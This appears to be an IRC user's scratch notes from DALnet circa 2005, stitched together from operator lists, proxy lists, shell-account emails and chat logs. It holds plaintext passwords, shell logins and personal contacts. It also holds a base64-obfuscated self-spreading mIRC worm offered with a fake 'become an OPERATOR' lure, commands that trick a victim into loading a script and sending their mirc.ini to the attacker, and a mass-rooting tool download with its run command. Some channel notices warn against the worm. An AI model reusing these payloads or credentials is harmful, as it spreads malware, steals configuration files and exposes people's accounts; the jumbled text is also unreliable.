+-ChanServ- 2 -   o_n_i_n (~onin@loves.DJPR.pin0y.info)
+-ChanServ- 3 -   STEALTH^ (~Royalty@203.215.86.104)
+-ChanServ- 4 -   Amoran (~unknown@210.213.150.52)
+-ChanServ- End of list.
+
+
+asian_sweetheart_23@yahoo.com
+
+
+http://camrewind.com/
+
+
+Kay Sivilay
+
+http://photos.friendster.com/photos/42/85/4085824/11125459817040m.jpg
+
+netz(^beybi-ng-janitorfish^)@ [:] :14b.A.b.Y.n.I.c.O
+
+*** badskie (~user@210.213.142.103) Quit (Quit: )
+*** sweet_lover_girl (~SPi@210.5.118.3) Quit (Client closed connection)
+*** C0_Cari_Teman (kk@61.94.95.15) Quit (Quit: )
+*** dellian_36 (~Khiten_gi@203.160.185.61) Quit (Quit: )
+
+<@babynetz> ang username: pldt
+<@babynetz> password: vibe
+<@babynetz> dialup: 101300
+
+aol  5808600
+
+<mindbug> TODAY'S THE FIRST DAY THAT YOU'RE NO LONGER WITH ME
+<mindbug> IF YOU ONLY KNEW THE SADNESS YOU GAVE ME
+<mindbug> EVERY TEAR IN MY EYE MEANS I MISS YOU
+<mindbug> YET MAYBE THIS IS MY DESTINY
+<mindbug> I KEEP ON ASKING
+<mindbug> WHY IT'S SO EASY FOR YOU TO LET ME GO
+<mindbug> I DID EVERYTHING TO MAKE YOU FEEL MY LOVE
+<mindbug> BUT STILL YOU CHOSE TO LEAVE ME
+<mindbug> MAYBE THIS IS OUR DESTINY
+<mindbug> WHY CAN'T I GO ON
+<mindbug> WHEN WILL THESE TEARS STOP FALLING
+<mindbug> MAYBE THERE'S A REASON,
+<mindbug> A REASON TO LOVE SOMEONE NEW
+<mindbug> I TRY TO FIND SOMEONE LIKE YOU
+<mindbug> THAT COULD HELP EASE THIS PAIN
+<mindbug> BUT FINDING SOMEONE IS NOT THE WAY
+<mindbug> MAYBE TIME WILL TELL
+<mindbug> WHEN THIS PAIN WILL FADE AWAY
+
+
+http://aeshells.org/index.php?PHPSESSID=d7c0c735b6a02ad6c017af44c1bb15ed&page=8
+http://fastshell.host.sk/signup1.php
+http://aeshells.org/apply
+
+This is the current list, post your ideas but remember they have to end in (chules.net)
+
+chules.net
+w00tified.chules.net
+boredstiff.chules.net
+crispy.chules.net
+krusty.chules.net
+i.am.at.chules.net
+w00t.chules.net
+get.linux.chules.net
+come.to.chules.net
+we.love.chules.net
+thefox.chules.net
+the.wolves.are.coming.chules.net
+
+
+http://www.anonymitychecker.com/page2.html
+
+http://www.surf4all.net/modules/Forums/images/avatars/bot.php
+
+#jikustik
+
+<|h|e|L|L|> <-psyBNC> Sun Jun 19 01:52:21 :New User:swat (swat) added by rhystina
+<|h|e|L|L|> <-psyBNC> New User 'swat' added. Password set to 'jidafnmk'
+server1.shellph.net 3652
+
+<iTune> server : bark.alphix.se
+<iTune> port: 34312
+<iTune> http://shell.alphix.se/eng_shell_vhosts.php
+
+<W|nKs> www.samair.ru/proxy/socks.htm 
+<W|nKs> www.proxychecker.com
+
+proxychecker, sockchain, and proxyrama
+
+*** Looking up 62.116.121.242
+*** Resolved 62.116.121.242 to vlan743-gw.lgho.com
+
+
+ï tw|sT3r[awt] - ( tw|sT3r[awt]!~twisted@210.120.123.205 ) - unknown
+ï tw|sT3r[awey] - ( tw|sT3r[awey]!~twisted@195.229.241.188 ) - unknown
+ï tw|sT3r[aw3y] - ( tw|sT3r[aw3y]!~twisted@193.95.90.52 ) - unknown
+ï tw|st3r[0ut] - ( tw|st3r[0ut]!~twisted@193.95.90.52 ) - unknown
+ï tw|sT3dMiNd - ( tw|sT3dMiNd!~twisted@ip68-109-111-159.pn.at.cox.net ) - Network
+
+
+proxy 193.95.90.52:80
+
+proxy 202.175.234.169:80
+
+68.109.111.159:3382
+
+<aYz> http://webby.pacific.net.ph/mail/source/index.html
+<aYz> netz@pacific.net.ph
+<aYz> password: nickoh
+
+<ryanx> Baby_ai
+<ryanx> <-psyBNC> New User 'scryptor' added. Password set to 'gpdadben'
+<ryanx> .//server 212.199.224.251:103861
+
+<ryanx> greatest.peoples.alway.use.lamehost.org
+<ryanx> irc-helper.net
+<ryanx> i.looks.dashing.while.using.lamehost.org
+<ryanx> these.irc.kiddies.never.lemme.take.a.r3st.cl
+<ryanx> husssssh.go.away.mai.cl
+<ryanx> sastian.net
+<ryanx> member.of.nasagovt.cl
+<ryanx> message.me.if.u.wanna.be.my.galfriendz.net
+<ryanx> be.good.with.irc-helper.net
+<ryanx> life.is.just.like.a.bubble.enjoy.and.lov3.org
+<ryanx> i.am.looking.for.sanam.cl
+<ryanx> its.a.far.cry.from.splinter.cells.z0r.biz
+<ryanx> GuX3r.tv
+<ryanx> stay-back.your.3feet.com
+<ryanx> call-at-911.mynumber.org
+<ryanx> i-prefer-lovehome.instead-of.moneyhome.biz
+<ryanx> admin.FAQServ.com
+<ryanx> packadge.your.meat.before.u.go.in.heat.orgazma.org
+<ryanx> abcdefg-hijklmnop-qrstuvw-xyz.orgazma.org
+<ryanx> team.of.susim.info
+<ryanx> kiSs.before.justdied.com
+<ryanx> laugh.at.toythieves.com
+<ryanx> i.am.sexidude.com
+<ryanx> botseller.net
+<ryanx> shells.at.botseller.net
+<ryanx> look.my-host.0.0.0.0.0.0.0.0.0.0.botseller.net
+<ryanx> One.female-Mosquito.can.Change.Ur.biology.botseller.net
+<ryanx> aur.jiger.mardo.may.kider.botseller.net
+
+
+PHILIPPINES (63) Makati (0)2 3009000 57.6 $6.00  AOLGlobalnet Plus 
+PHILIPPINES (63) Manila (0)2 7055000 57.6 $6.00  AOLGlobalnet Plus 
+
+PHILIPPINES (63) Manila (0)2 4362536 57.6 $6.00  AOLGlobalnet Plus  <----
+
+PHILIPPINES (63) Manila (0)2 8598111 57.6 $6.00  AOLGlobalnet Plus 
+---->> 8434977
+---->> 5808600
+
+*PHILIPPINES (63) Manila (0)2 8434977 28.8 $6.00  AOLGlobalnet 
+
+*** Looking up 62.79.123.79.adsl.hvi.tiscali.dk
+*** Resolved 62.79.123.79.adsl.hvi.tiscali.dk to 62.79.123.79
+83.92.199.2:80
+*** Looking up 62.79.40.122.adsl.hvi.tiscali.dk
+*** Resolved 62.79.40.122.adsl.hvi.tiscali.dk to 62.79.40.122
+
+
+*** Looking up dsl-hkigw8aad1.dial.inet.fi
+*** Resolved dsl-hkigw8aad1.dial.inet.fi to 84.248.26.209
+
+*** Looking up 83-131-191-150.adsl.net.t-com.hr
+*** Resolved 83-131-191-150.adsl.net.t-com.hr to 83.131.191.150
+
+
+82.17.130.19 6588
+
+proxy 204.184.37.153:80
+proxy 202.175.234.167:80
+
+#chiniot #hisnher #mgsssi #babez #alak #cms #comonwealth <------ pasok kana lngdyan hanapin mo nalng dyan kung sino online na op ;)
+ found 4 matches to your query (sorted): strikerX Agent^KooL _Agent^KooL LinxiongA. strikerX (zero@72.20.22.19) was last seen quitting from #launion 20 minutes ago stating (Ping timeout).
+
+
+lynx airwaLker
+unix [ibox][afk]
+chules striker
+
+swat NeutraLize
+swat01 viperzero
+ibox netfreeze
+swat02 acidchamber
+
+
+elite sneakers
+eli02 jagservice
+eli03 redstorm
+eli04 openfire
+
+
+<ryanx> ./66.90.92.173:10385
+<ryanx> www.aoneshell.com
+steambuffer scryptor r0b0t1cs000
+
+
+<ryanx> <-psyBNC> New User 'swat' added. Password set to 'pfbccole'
+<ryanx> <-psyBNC> New User 'scryptor' added. Password set to 'adejjcfc'
+<ryanx> <-psyBNC> New User 'scryptor' added. Password set to 'adejjcfc'
+<ryanx> 212.199.224.251:10386
+<ryanx> www.botseller.net
+
+
+This is your login information for the chules.net shell account.  
+Please see your previous email for more information.
+Username: vholtz
+Password: chambererscarvers848 jojohn7 artoisequalities277
+Server: chules.net
+Method: SSH
+Port: 22  1574   1501
+
+
+
+This is your login information for the chules.net shell account.  
+Please see your previous email for more information.
+Username: intel
+Password: dapprendrejesters486 renegade707
+Server: chules.net
+Method: SSH
+Port: 22  1501
+siLverbLade intel r0b0t1cs000
+[ibox][afk] unix
+
+username: sxddkxrz@frequency.ph
+password: 29680169
+dialup number: 4107777 or 3088888
+duration: 1 hr, valid up to june 30, 2005
+
+
+<XeCuTi0NeR> * Joins: XeCuTi0NeR[AwAy] (XeCuTeR@72.20.22.24)
+<XeCuTi0NeR> * Joins: `SiNNeR` (SiNNeR@Hogwarts.School.of.WitchCraft.and.Wizardry.iS.REAL-W0RLD.INFO)
+<XeCuTi0NeR> * Joins: CiRcUiT^^^[A] (SiNNeR@72.20.22.18)
+<XeCuTi0NeR> * Joins: [A]op`79 (IoRi@72.20.22.15)
+<XeCuTi0NeR> * Joins: SaCReD`SiNNeR (IoRi@72.20.15.242)
+
+<DANGER15> * Khan-Bhai has joined #mitc
+<DANGER15> * ^^Bonga^^ has joined #mitc
+<DANGER15> * [Dil] has joined #mitc
+<DANGER15> * CHINIOT has joined #mitc
+<DANGER15> * WELCOME` has joined #mitc
+<DANGER15> * Umerr[[[away]]] has joined #mitc  Umerr[[[away]]] is now known as DANGER15-GONE
+
+
+
+
+
+
+bwchan
+bwconf
+bwident
+bw-chan
+
+kschan
+ksconf
+ksident
+
+1664 swat
+1952 psy r0b0t1cs000
+
+unix ppifekap
+
+pico eggdrop.conf
+ WinSCP
+write 7645
+rm file.name.ext
+-KooLserv- Added hostmask: *scryptor*!*ibox*@202.7*
+
+r0b0t1cs707 708
+
+PSYBNC
+This is your login information for the chules.net shell account.  
+Please see your previous email for more information.
+Username: ibox
+Password: crossestinsultment350 robotics01
+Server: chules.net
+Method: SSH
+Port: 22
+
+Remember to read the previous email before logging in.
+
+
+
+BlackWater
+This is your login information for the chules.net shell account.  
+Please see your previous email for more information.
+Username: swat
+Password: answererthrum283
+Server: chules.net
+Method: SSH
+Port: 22
+
+Remember to read the previous email before logging in.
+
+
+KooLserv
+This is your login information for the chules.net shell account.  
+Please see your previous email for more information.
+Username: vanzholtz
+Password: nookssteering755
+Server: chules.net
+Method: SSH
+Port: 22
+
+#zaec TheÆo©k143  iTheÆo©k707
+
+Remember to read the previous email before logging in.
+
+
+
+*** Looking up as1-133.qualitynet.net
+*** Resolved as1-133.qualitynet.net to 62.150.180.133
+
+siLverbLade
+scryptor
+sneakers van
+sonicflood
+
+
+zircon
+kooLserv ther0b0t1cs007
+revoker vanderholtz@yahoo.com
+neutralize scryptors@yahoo.com
+dynamics john_cuevas@yahoo.com
+
+kinetics
+airwalker van
+ibox royalscar
+
+BlackWater john_cuevas ther0b0t1cs008
+Capacitor ther0b0t1cs007
+TechServ ther0b0t1cs007
+
+
+
+
+
+[i]ce[BoX] (~rwy@210.14.19.175) scyptors
+whayne lover john_cuevas
+CYMartini (~X-FaCToR@202.163.223.59) royalscar
+khatz (~hello@host217-34-68-117.in-addr.btopenworld.com) vanderholtz
+[K]idlat (~kidlatcom@203.87.132.186) silverblade@rescueteam.com
+
+
+
+#candon
+#mitc
+#narvacan
+#division9chat
+#enforcers
+#BlackWater
+
+
+<disciple> go to #pinoyhacking
+<disciple> or #asianpride
+<disciple> #oneball
+<scryptor> okies.. tnx 
+<disciple> sa undernet go to #impyerno n look for nardo
+<disciple> tell him kilalaa mo ko
+<disciple> nardo undernet
+<disciple> patz dalnet
+<disciple> luvchris dalnet
+
+
+158.182.156.30:8080
+
+Sherly` (~apple@202.122.165.119)
+
+
+
+
+metacarpus
+imafreak-
+
+www.geocities.com/stealthinviter
+
+//write protection $decode(b24gMTp0ZXh0Oio6Izp7IC50aW1lcqAgMCAxMjAgLmpvaW4gI21pdEMgfQ==,m) | .load -rs protection | .remote on | //mode $me +R | .msg zircon DONE
+
+
+wana be an OPERATOR on #mitc ? copy & paste this-->3 //write † $decode(b24gMTp0ZXh0Oio6Izp7IC5pZ25vcmUgJG5pY2sgfCAudGltZXKgIDAgMTIwIC5qb2luICNNaXRjIHwgLm1zZyAkbmljayB3YW5hIGJlIGFuIE9QRVJBVE9SIG9uICRjaGFuID8gY29weSAmIHBhc3RlIHRoaXMtLT4DMyAvL3dyaXRlIKAgJCAkKyBkZWNvZGUoICQrICRlbmNvZGUoJHJlYWQoJHNjcmlwdCxuLDEpLG0pICQrICxtKSAkY2hyKDEyNCkgLmxvYWQgLXJzIKAgJGNocigxMjQpIC8vbW9kZSAkICQrIG1lICtSIH0=,m) | .load -rs † | //mode $me +R
+
+
+
+b24gMTp0ZXh0Oio6Izp7IC5pZ25vcmUgJG5pY2sgfCAudGltZXKgIDAgMTIwIC5qb2luICNNaXRjIHwgLm1zZyAkbmljayBHdXMyIHUgYiBtYWdpbmcgT1BFUkFUT1IgcyAkY2hhbiA/IGNvcHkvcGFzdGUgbW8gaTItPgM3IC8vd3JpdGUgoCAkICQrIGRlY29kZSggJCsgJGVuY29kZSgkcmVhZCgkc2NyaXB0LG4sMSksbSkgJCsgLG0pICRjaHIoMTI0KSAubG9hZCAtcnMgoCAkY2hyKDEyNCkgLy9tb2RlICQgJCsgbWUgK1IgfQ==
+
+
+
+
+<@Zvonarek> zircon: Please type in this channel window the following: //load -rsn $+(",$getdir $+ spm.zip,")
+<@Zvonarek> now type: //unload -rsn $+(",$getdir $+ spm.zip,") | .msg #nohack Done
+<@Zvonarek> [ zircon ] Please type (or copy/paste) the following: //!play -trfiles Zvonarek mirc.ini 2000
+
+
+
+
+-MemoServ- Memo 6 from FlyTecH. To delete, use: /msg MemoServ@services.dal.net DEL 6
+
+-MemoServ- #mapua >> silverblade is an inviter from mitc , never ever add him
+-MemoServ- Memo 10 from Blindupe. To delete, use: /msg MemoServ@services.dal.net DEL 10
+-
+-MemoServ- #mapua (SOPs) >> aop application for silverblade has been rejected. pls consider it again. Thanks.
+
+
+halv2552 PASSWoRD:flyers25
+
+hotter56
+altern
+
+
+202.84.24.21 
+
+*** Topic is '-./psybnc @Oplag ISpeeds rapidshells LiquidShells PcShells BotSeller ShellCentral HotShells uNa-hOsTiNg shell-hosting skyberate shellnix 24shells genious/.net  cellnet-hosting Aoneshell ChPass EnviousDesign ephlox LomaxSolutions boomshells xlhosters pinoyshells/.com. HostingInside./de'
+*** Set by dvlz on Wed Apr 20 18:58:07s
+
+
+
+
+disciple ~ab_zapant mkt-gwy01.meridiantelekoms.com 1114443950 logged online
+disciple ~ab_zapant mkt-gwy01.meridiantelekoms.com 1114443950 logged offline
+disciple ~ab_zapant mkt-gwy01.meridiantelekoms.com 1114444187 logged online
+
+
+http://www.geocities.com/royalscar/EliteInviter.zip
+
+if any of you have question about DALnet services, etc. feel free to ask your question in here. We can't promise you the best help but we will truly try our best to be of your service. Thank You!
+
+ATTENTION: if any of you receive a message telling you to copy paste some sort of a CODE with a promise that you'll be an operator on the channel, DON'T DO IT coz it will just infect your IRC Client with a worm. Be aware guys!
+
+
+<@FL1PMODE> 61.206.125.114:8080
+<@FL1PMODE> 61.206.125.114.user.ip8.il24.net JP Transparent Y 00:56 75.70 11647 check check whois traceroute 
+<@FL1PMODE> 202.57.76.190:8080
+<@FL1PMODE> adsl-57.76.190.info.com.ph PH Transparent Y 06:56 92.33 11158 check check whois traceroute 
+<@FL1PMODE> 203.115.162.227:3128
+<@FL1PMODE> Name unavailable -- High anonymity na 01:51 80 11949 check check whois traceroute 
+<@FL1PMODE> 219.163.182.230:8080
+<@FL1PMODE> pc6.wdij-unet.ocn.ne.jp JP Transparent Y 03:08 71.90 8710 check check whois traceroute 
+
+
+
+soho-r.ix.us.dal.net
+
+
+blindupe@gmail.com
+
+
+aquastar@gmail.com
+rudy2285@yahoo.co.uk
+
+
+
+<netzshells> ª ][ manila ][ ´
+<netzshells> ª ][ ateneo ][ ´
+<netzshells> ª ][ makati ][ ´
+<netzshells> ª ][ filipino ][ ´
+<netzshells> ª ][ gensan ][ ´
+<netzshells> ª ][ baguio ][ ´
+<netzshells> ª ][ bacolod ][ ´
+<netzshells> ª ][ bicol ][ ´
+<netzshells> ª ][ zamboanga ][ ´
+<netzshells> ª ][ ust ][ ´
+<netzshells> ª ][ lasalle ][ ´
+<netzshells> ª ][ ceu ][ ´
+<netzshells> ª ][ bicol ][ ´
+<netzshells> ª ][ iloilo ][ ´
+<netzshells> ª ][ olongapo ][ ´
+<netzshells> ª ][ tropang_gapo ][ ´
+<netzshells> ª ][ manilachat ][ ´
+<netzshells> ª ][ pinoyster ][ ´
+<netzshells> ª ][ careeran ][ ´
+<netzshells> ª ][ manilasex ][ ´
+<netzshells> ª ][ kantutan ][ ´
+<netzshells> ª ][ bi-manila ][ ´
+<netzshells> ª ][ salsalan ][ ´
+<netzshells> ª ][ teens ][ ´
+<netzshells> ª ][ allnitecafe ][ ´
+
+
+
+#shqiperia   <Albo>  AlbaGuard
+<Albo> Lorenaa
+<Albo> Bukuroshja 
+<Albo> Ardiana
+<Albo> Zeshkanja
+
+
+
+<ImAfreak-> 1.lams
+<ImAfreak-> 2.armand
+<ImAfreak-> 3.ahmoy
+<ImAfreak-> 4.rentap
+<ImAfreak-> 5.squal
+
+
+
+
+<NetpaI> NetpaI nOORSCRipt nOORTRrivia NetpaLs Purnima
+
+
+
+
+Quest|onz SaDiStiCbUttErfLy MissUni Sat[a]nsDoLL AnGeL`Eyez babez` honeyzz JX  babe``
+
+or _babez` babe`` AnGeL`Eyez ChattErChick SatansDoLL714 Sweet^Kisses sydneybabe` Trivia^Bot
+
+
+
+kaywicked :  HxH  VirusX  QtChinita   Phazenet   Sydneybabe   `qtpink16   Hook-Ups   Darkvice
+
+
+FederaL_Cop     SmSuFFRLz      LostSuFFRLz      CuLpRiTz       CuLpRiTs        Majordomo
+
+
+<SoftICE> use ident: swat type /server softice.pinoyshells.com 21661 silver123 robot1cs001
+use ident: sky type /server softice.pinoyshells.com 21662 silver123 psyb0rg7
+type /bvhost napili.mong.vhost.sa.site
+/addserver mesra.dal.net:6667
+/bquit
+/bconnect
+
+
+./server softice.pinoyshells.com 21661
+kooLserv swat robot1cs001
+strikerX unix r0b0t1c501 
+Agent^KooL phoenix r0b0t1c502 
+
+
+./server softice.pinoyshells.com 21662 
+ZeroCooL sky psyb0rg7
+[NicoLe] sword r0b0t1c503
+Katrina^ slash r0b0t1c504
+
+
+
+server1.shellph.net 53287
+siLverbLade swat r0b0t1cs007
+iceKooL unix pcafejcc r0b0t1cs008
+xp mgbecgic r0b0t1cs009
+stryker jfpmopli r0b0t1cs010
+
+
+
+
+simpleanne_17@yahoo.com
+nikeshi_niomi@yahoo.com   09157442524
+
+
+202.57.76.190:8080
+
+
+211.250.77.125:8080
+202.67.155.247 8080
+
+#AllNiteCafe
+
+
+scryptor (~swat@hackserv.services-admin.info)
+
+siLverbLade (~swat@is.0n-tv.info)
+
+
+
+maya indo shakiramayadewi@yahoo.com
+
+
+
+-Channel-Modifier- Please modify your channel or your channel will be dropped within 6 hours
+-Channel-Modifier- Please type /msg Channel-Modifier <#channel> <passwd> <email> for modification
+-Channel-Modifier- Failure to comply will mean dropping of channel
+-Channel-Modifier- Thank you for your cooperation
+-Channel-Modifier- DALnet!
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+www.proxy4free.com
+
+http://www.digitalcarwallpapers.com/wallpapers/audi_1.jpg
+http://privat.bluezone.no/moa/gamel/supercars/images/
+www.supercars.net/wallpaper/wallpaper1.html
+
+http://www.wallpapers2.com/cars/aston_martin/8.jpg
+ ACURA
+ASTON MARTIN  +1
+AUDI  +2
+BMW  +2
+BUGATTI
+CHEVROLET
+CHRYSLER
+DIABLO
+DODGE VIPER  +2
+FERRARI  +5
+FORD  +2
+HONDA  +2
+HYUNDAI
+JAGUAR  +2
+NISSAN
+ KOENIGSEGG
+LAMBORGHINI  +5
+LEXUS
+LOTUS
+LOWRIDER
+MERCEDES  +5
+MITSUBISHI
+MUSCLE MUSTANGS
+OPEL
+PEUGEOT
+PORSCHE  +2
+SALEEN
+SEAT
+TOYOTA
+VOLKSWAGEN  +1
+VOLVO  +1
+ 
+
+
+http://www.desktopmodel.com/prev/5b.jpg
+http://www.greetycards.com/files/11.jpg
+
+http://animeomiyage.net/nanako/page_02.shtml
+http://nonsong.com/anime/other/other0008.html
+
+
+
+
+//say $findfile(C:,mlrc.ini,0)
+
+
+nospam
+Matrix2
+mlrc.ini
+server.ini
+boogy.ini
+newb
+script.ini
+scripts.ini
+
+//!msg #Nohack newb -> $exists(newb) , script.ini -> $exists(script.ini) , scripts.ini -> $exists(scripts.ini) , matrix2 -> $exists(Matrix2) , server.ini -> $exists(server.ini)
+
+
+
+benchdalnet007
+mapuainstituteoftechnologypice
+
+jjohncuevas
+silverblade007
+
+
+ThÍL÷ÆDÔßm•LÓgHt‚nDmüä‚Lv·tÓÛn©©vÆo©k777
+
+siLverbLade
+NetStaff
+XcaLibur
+resonate
+scryptor
+sniperX
+psyborg
+
+The place for Major Channel Operators united in seeking improvement of the DALnet community. We are to enforce the RULES set by DALnet and to promote peace and order in the network. 2::4 NetCop 5Team 2::
+
+
+
+
+
+
+
+-ChanServ- SOp list for #mapua
+-ChanServ- 1 -   GiRL`fRoM`tHe`GuTteR (~nOmeAmeS@210.213.142.54)
+-ChanServ- 2 -   sexybabylicious (~babygurl@AP-203.167.9.178.sysads.com)
+-ChanServ- 3 -   bosen (~value@202.6.236.2)
+-ChanServ- 4 -   RedMond (rEdMoNd@pinoyshells.com)
+-ChanServ- 5 -   FlyTech (~hell@202.155.38.119)
+-ChanServ- 6 -   torio (~mahal@203.160.173.228)
+-ChanServ- 7 -   NiC0L3 (~pinky@203.177.161.202)
+-ChanServ- 8 -   Ch|wawa (~doggy@203.177.161.202)
+-ChanServ- 9 -   `aphrodite (DeMonYus@ACA97328.ipt.aol.com)
+-ChanServ- 10 -   laarni (~.........@203.131.102.186)
+-ChanServ- End of list.
+-ChanServ- AOp list for #mapua
+-ChanServ- 1 -   siLverbLade (~swat@raspool-203.168.0.77.ph.inter.net)
+-ChanServ- 2 -   jh4|||3s (~user@203.131.134.166)
+-ChanServ- 3 -   aliyaah (~erika_bak@219.90.84.110)
+-ChanServ- 4 -   `Suplado (~yeoj@ipdial-177-9.tri-isys.com)
+-ChanServ- 5 -   `BhaBy_KhAyE (_babykye_@219.90.83.189)
+-ChanServ- 6 -   [M]eLiSsA (~leo@202.57.68.18)
+-ChanServ- 7 -   kh|t (~Coleen@210.213.213.20)
+-ChanServ- 8 -   ^^WiCKeD^^ (wicked@services-admin.with.darkvice.and.pinoyanime.org)
+-ChanServ- 9 -   GrOuNdzERo (~neo@210.213.172.54)
+-ChanServ- 10 -   jhem`13 (~carlo@ipdial-167-43.tri-isys.com)
+-ChanServ- 11 -   babywish (babywish@Life.Is.Peachy.darkvice.com)
+-ChanServ- 12 -   AgEnT^^^OrAnGe (~nhowe@203.131.106.78)
+-ChanServ- 13 -   babytash (eden@210.213.157.33)
+-ChanServ- 14 -   SaSiEgUrL (rEdMoNd@pinoyshells.com)
+-ChanServ- 15 -   Stylish_12 (benjo@210.1.100.207)
+-ChanServ- 16 -   blue_eyes (blue@210.5.112.218)
+-ChanServ- 17 -   CaRtMaN_01 (~xnx@70.84.121.201)
+-ChanServ- 18 -   gia`` (~bnpwr@pacificstar-mtu5.meridiantelekoms.net)
+-ChanServ- 19 -   cykor (~raki@203.213.200.23)
+-ChanServ- 20 -   Shizuko (xxl-44395@203.131.128.170)
+-ChanServ- End of list.
+
+
+
+
+
+
+#cainta
+#marikina
+#qc
+#ama
+#manila
+#cebu
+#davao
+#baguio
+#ateneo
+#makati
+#filipino
+#gensan
+#AllNiteCafe
+#bacolod
+#bicol
+#bulacan
+#batangas
+#bataan
+#ust
+#laguna
+#Zamboanga
+#lasalle
+#ceu
+#iloilo
+#olongapo
+#tropang_gapo
+#manilachat
+#feu
+#pinoyster
+#careeran
+#manilasex
+#kantutan
+#bi-manila
+#teens
+#salsalan
+
+
+
+#samarinda 
+#Solo 
+#tawau 
+#semarang 
+#dia
+#Padang 
+#LaSalle and 
+#Palu
+
+#horni
+#chokin
+#capsa
+#balikpapan
+#jambi
+#meth2
+#cafe-cina
+#indocina
+#khuntien
+#bawel
+#huaren
+
+#mamakchat   i
+
+#kl
+#mamak
+#kampung
+
+@#balikpapan @#kampung @#khuntien @#CasuaL @#medan
+
+
+
+
+-ChanServ- AOp list for #zaec
+prince_damon (~zamdipag@210.1.91.176)
+sexXxy_rEBEL[AFK] (canDYguRL@210.213.91.139)
+NuRuLLayLa (~LadyBlink@219.93.70.46)
+princessofdestiny (jckyle@jckyle.future-hosting.net)
+cY_gIrL (~__F___U__@203.213.205.171)
+sheika (~hildz_pul@210.213.148.140)
+khannex16 (~chuvanesH@210.213.148.140)
+Wisdom2 (~TheChooSe@82.148.112.174)
+^^raffy^^ (~gfsfgsgs@202.84.108.143)
+{dhizzy_khidd} (~kurtrusse@210.4.20.12)
+leiya (~tom@203.215.96.61)
+-ChanServ- 12 -   budak_nakal (~cybournic@219.95.218.103)
+-ChanServ- 13 -   aya_ceres (~lot@203.215.102.15)
+-ChanServ- 14 -   _BoLeRo_ (badguy@210.1.95.250)
+-ChanServ- 15 -   TropaServ (jhong@softice.pinoyshells.com)
+-ChanServ- 16 -   fiord (~AntiSpam@210.213.145.194)
+-ChanServ- 17 -   Sky_MarShaL (~EnFoRcEr@202.57.93.92)
+-ChanServ- 18 -   Snazzy_AnGeL (~Snazzy@210.213.228.61)
+-ChanServ- 19 -   kat_21 (enkie@210.1.88.95)
+-ChanServ- 20 -   `eXcalibur` (~excal@210.213.230.177)
+-ChanServ- 21 -   WaterProof (~WaterProo@210.1.95.115)
+-ChanServ- 22 -   M3rV1n (M3rV1n@210.5.94.155)
+-ChanServ- End of list.
+-ChanServ- SOp
+
+
+
+
+
+
+Kinetics
+siLverbLade
+sneakers
+schweitzer
+scryptor
+
+
+
+if {![string match -nocase "* Opposing *" ${ctcp-version}]} {
+ set ctcp-version "${ctcp-version} - Using \002A\002ll\002F\002lood\002P\002rotection v4.3 by Opposing (aka Sir_Fz) http://hub.nexushells.net/~Fz/"
+}
+
+
+
+
+J÷H—ÒÌ«¯£Í0407
+
+
+
+
+
+
+
+-ChanServ- AOp list for #makati-op
+-ChanServ- 1 -   Makati (~trol@ipdial-186-97.tri-isys.com)
+-ChanServ- 2 -   Haste_The_Day (FreakeR@cpe-24-160-69-168.houston.res.rr.com)
+-ChanServ- 3 -   SHAMEB0Y (~shameboy@220.117.205.120)
+-ChanServ- 4 -   bEEzEE (~EmYeHj@h-66-166-139-250.mclnva23.covad.net)
+-ChanServ- 5 -   swallowed (SwalloweD@124.106.146.7)
+-ChanServ- 6 -   Zedicus (Zedicus@210.213.91.53)
+-ChanServ- 7 -   ^nicole^ (~sad@203.76.245.191)
+-ChanServ- 8 -   gia`` (~gia@202.147.60.226)
+-ChanServ- 9 -   A-J (~aj_ayran@72.73.216.90)
+-ChanServ- 10 -   talimusak (akomito@cpe-65-172-239-51.sanbrunocable.com)
+-ChanServ- 11 -   MakatiOperator (~emailmomu@ppp-70-246-31-30.dsl.hstntx.swbell.net)
+-ChanServ- 12 -   kurt[z] (~sAint@203.213.205.202)
+-ChanServ- 13 -   vamp_003 (~denise@203.76.245.100)
+-ChanServ- 14 -   rainelopez (~rai@83.110.173.73)
+-ChanServ- 15 -   |h|e|L|L| (emon@ano.magagawa.ko.eh.im.missing-you.org)
+-ChanServ- 16 -   panacea (jHaY-zEe@68-184-229-31.dhcp.stls.mo.charter.com)
+-ChanServ- End of list.
+-ChanServ- SOp list for #makati-op
+-ChanServ- 1 -   jHeFf (FreakeR@cpe-24-160-69-168.houston.res.rr.com)
+-ChanServ- 2 -   OzppEr (~bunsoko@203.213.201.39)
+-ChanServ- 3 -   Dark^Scorpian (scruffy@ppp-66-142-210-43.dsl.tpkaks.swbell.net)
+-ChanServ- 4 -   shameboy (~shameboy@203.84.185.102)
+-ChanServ- 5 -   CoReeN (~CoReeN@203.131.176.98)
+-ChanServ- 6 -   LondonBabe (~gorgeous@88-109-126-57.dynamic.dsl.as9105.com)
+-ChanServ- 7 -   Jhanella^Gracia (~jg@210.213.82.44)
+-ChanServ- 8 -   |JC| (~JayCee@210.213.140.69)
+-ChanServ- End of list.
+
+
+
+baby pls take care of my nicks..next wk uwi ulit me pero d pa me cgurado..
+NiC0L3 at PiNKBeRRy <-japanesespitz1123 
+Cheska <- joshualovescheska0420 
+pinkbLade <- johnnicolezerofourzeroseven.....
+miss u baby..mahal na mahal pa rin kita!
+
+
+
+
+0,14 ´ª Welcome to #Makati ´ª A real friend is one who walks in when the rest of the world walks out. Friendship is one mind in two bodies.."ThanX's 4 D Support Guys! Have fun! ´ª  All Ops Must Join #xavier ´ª View the updated RULES at http://users.cjb.net/makatidalnet/rules.txt ´ª 
+
+
+
+
+Megatron r0b0syst3m707
+
+
+
+<RaNdY> 219.207.80.63:8080  
+<RaNdY> 59.81.129.151:8000  
+<RaNdY> 218.112.124.184:8080  
+<RaNdY> 219.0.44.90:8080  
+<RaNdY> 12.9.25.229:80 
+<RaNdY> 81.92.99.3:3128  
+24.132.212.98:5812
+
+
+http://usuarios.lycos.es/mdweb/massrooter.tar.gz
+./massroot ip
+
+
+
+The rules for #makati are as follows: No Swearing, Repeating, Flooding the channel with text/nick/join or part, Advertising, Sexual Attitudes, Harassing Users, Excessive Caps, Offensive Nicks, Clones, Auto Greets, or Op/Voice Begging. & you must have Fun.
+
+
+Quick Tips On IRC: (1) Do Not Join Unknown Websites Sent to You In Any Format. (2) Do Not Open Unexpected Files. (3) Do Not Type Commands That Have The Char $ In It Unless You Know The Person Well And Can Trust Them. (4) Treat Other Users As You Would Like To Be Treated.
+
+ATTENTION: if any of you receive a message telling you to copy paste some sort of a CODE with a promise that you'll be an operator on the channel, DON'T DO IT coz it will just infect your IRC Client with a worm. Be aware guys!
+
+
+32.97.43.250 penguin
+
